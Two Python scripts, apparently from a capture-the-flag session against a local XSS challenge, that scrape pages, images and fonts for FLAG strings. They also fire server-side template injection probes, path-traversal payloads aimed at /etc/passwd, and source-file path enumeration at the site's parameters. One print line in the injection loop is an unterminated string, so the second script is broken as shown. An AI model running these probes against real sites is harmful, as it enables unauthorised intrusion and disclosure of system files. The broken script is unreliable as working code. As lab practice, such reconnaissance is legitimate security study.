import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

# Get root page
print("[+] Getting root page content...")
resp_root = requests.get(f"{base_url}/")
print(f"Status: {resp_root.status_code}")
print(f"Length: {len(resp_root.text)} bytes")
print("\n[+] Root page content:")
print(resp_root.text)
print("=" * 60)

# Check for flags
flags = flag_pattern.findall(resp_root.text)
if flags:
    print(f"\n[!] FLAGS FOUND on root page: {flags}")

# Look for hidden comments
comments = re.findall(r'<!--(.*?)-->', resp_root.text, re.DOTALL)
if comments:
    print(f"\n[+] HTML Comments:")
    for c in comments:
        print(f"  Comment: {c.strip()[:200]}")

# Look for script content
scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp_root.text, re.DOTALL | re.IGNORECASE)
if scripts:
    print(f"\n[+] Script content:")
    for s in scripts:
        if s.strip():
            print(f"  Script: {s.strip()[:300]}")

print("\n" + "=" * 60)
print("[+] Searching for media and other files...")

# Get full CSS content
css_url = f"{base_url}/static/css/style.css"
css_resp = requests.get(css_url)
print(f"\n[+] Full CSS content:")
print(css_resp.text)

# Check for flag in CSS
flags = flag_pattern.findall(css_resp.text)
if flags:
    print(f"\n[!] FLAGS IN CSS: {flags}")

# Check for URLs in CSS
urls = re.findall(r'url\(["\']?([^"\')]+)', css_resp.text)
if urls:
    print(f"\n[+] URLs found in CSS:")
    for url in urls:
        print(f"  - {url}")

print("\n" + "=" * 60)
print("[+] Checking image files for hidden data (steganography)...")

# Images to check
images = [
    "/static/img/logo5_white.png",
    "/static/img/cookies/new_star.png",
    "/static/assets/fav-icon.png",
    "/static/img/dalgonabg.jpg"
]

for img in images:
    try:
        url = f"{base_url}{img}"
        resp = requests.get(url)
        print(f"\n[+] {img}:")
        print(f"    Status: {resp.status_code}")
        print(f"    Content-Type: {resp.headers.get('Content-Type', 'N/A')}")
        print(f"    Size: {len(resp.content)} bytes")
        
        # Check raw bytes for FLAG pattern
        flags = flag_pattern.findall(resp.content.decode('latin-1', errors='ignore'))
        if flags:
            print(f"    [!] FLAG FOUND in image: {flags}")
            
        # Look for text chunks in PNG
        if img.endswith('.png'):
            text_chunks = re.findall(rb'(tEXt|iTXt|zTXt)(.{1,500})', resp.content, re.DOTALL)
            for chunk_type, chunk_data in text_chunks[:3]:
                try:
                    decoded = chunk_data.decode('latin-1', errors='ignore')
                    print(f"    Text chunk: {decoded[:100]}")
                except:
                    pass
                    
    except Exception as e:
        print(f"    [X] Error: {e}")

print("\n[+] Checking for data URIs and base64 encoded data...")
all_pages = [requests.get(f"{base_url}/").text, requests.get(f"{base_url}/page").text]
for page_text in all_pages:
    # Look for base64 encoded strings
    b64_pattern = re.compile(r'data:image/[^;]+;base64,([A-Za-z0-9+/=]+)')
    b64_matches = b64_pattern.findall(page_text)
    if b64_matches:
        print(f"[+] Found {len(b64_matches)} base64 data URIs")
        for b64 in b64_matches[:3]:
            try:
                import base64
                decoded = base64.b64decode(b64[:100])
                flags = flag_pattern.findall(decoded.decode('latin-1', errors='ignore'))
                if flags:
                    print(f"    [!] FLAG in base64: {flags}")
            except:
                pass

print("\n[+] Complete.")

import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

# Check font files
print("[+] Checking font files for hidden flags...")

font_files = [
    "/static/css/fonts/Game-Of-Squids.otf",
    "/static/css/fonts/Game-Of-Squids.eot",
    "/static/css/fonts/Game-Of-Squids.woff2",
    "/static/css/fonts/Game-Of-Squids.woff"
]

for font in font_files:
    try:
        url = f"{base_url}{font}"
        resp = requests.get(url)
        print(f"\n[+] {font}:")
        print(f"    Status: {resp.status_code}")
        print(f"    Size: {len(resp.content)} bytes")
        
        if resp.status_code == 200:
            # Search in binary content for text
            flags = flag_pattern.findall(resp.content.decode('latin-1', errors='ignore'))
            if flags:
                print(f"    [!] FLAG FOUND: {flags}")
            
            # Look for readable strings
            readable = re.findall(rb'[\x20-\x7e]{10,}', resp.content)
            for r in readable[:5]:
                try:
                    decoded = r.decode('ascii', errors='ignore')
                    if 'flag' in decoded.lower() or 'FLAG' in decoded:
                        print(f"    [+] Interesting string: {decoded}")
                except:
                    pass
    except Exception as e:
        print(f"    [X] Error: {e}")

print("\n" + "=" * 60)
print("[+] Checking index.css from root page...")

# Get index.css mentioned in root page
resp_css = requests.get(f"{base_url}/static/css/xss/index.css")
print(f"Status: {resp_css.status_code}")
if resp_css.status_code == 200:
    print(f"Content:\n{resp_css.text}")
    flags = flag_pattern.findall(resp_css.text)
    if flags:
        print(f"[!] FLAGS: {flags}")

print("\n" + "=" * 60)
print("[+] Trying to understand the XSS challenge structure...")

# The page shows input field - maybe we need to use the form properly
# Let's look at what happens when we submit the form with GET

print("\n[+] Analyzing form submission behavior...")

# Check if there's a submit action or form handler
page_resp = requests.get(f"{base_url}/page")
print(f"Page content:\n{page_resp.text}")

# Look for forms and their actions
forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*>', page_resp.text, re.IGNORECASE)
print(f"\n[+] Form actions found: {forms}")

# Look for method
methods = re.findall(r'<form[^>]*method="([^"]*)"[^>]*>', page_resp.text, re.IGNORECASE)
print(f"[+] Form methods found: {methods}")

print("\n" + "=" * 60)
print("[+] Trying payloads that might reveal server-side data...")

# Try payloads that might trigger server-side errors/info disclosure
payloads = [
    "${7*7}",
    "{{7*7}}",
    "<%= 7*7 %>",
    "#{7*7}",
    "${{7*7}}",
    "<% 7*7 %>",
    "{7*7}",
    "#{7*7}",
]

for payload in payloads:
    for param in ['input', 'name']:
        url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
        try:
            resp = requests.get(url)
            if '49' in resp.text:
                print(f"[!] SSTI DETECTED! Payload '{payload}' evaluated
                break
        except:
            pass

print("\n[+] Testing for LFI/RFI...")
lfi_payloads = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
]

for payload in lfi_payloads:
    for param in ['input', 'name', 'page', 'file']:
        url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
        try:
            resp = requests.get(url)
            if 'root:' in resp.text or 'daemon:' in resp.text:
                print(f"[!] LFI DETECTED! param={param}, payload={payload}")
                print(f"Response: {resp.text[:500]}")
        except:
            pass

print("\n[+] Checking other common paths...")
other_paths = [
    "/source",
    "/source.py",
    "/app.py",
    "/server.py",
    "/main.py",
    "/index.py",
    "/static",
    "/uploads",
    "/files",
    "/backup",
    "/old",
]

for path in other_paths:
    try:
        url = f"{base_url}{path}"
        resp = requests.get(url)
        if resp.status_code in [200, 301, 302, 403]:
            print(f"[+] {path} - Status {resp.status_code}")
    except:
        pass

print("\n[+] Analysis complete.")

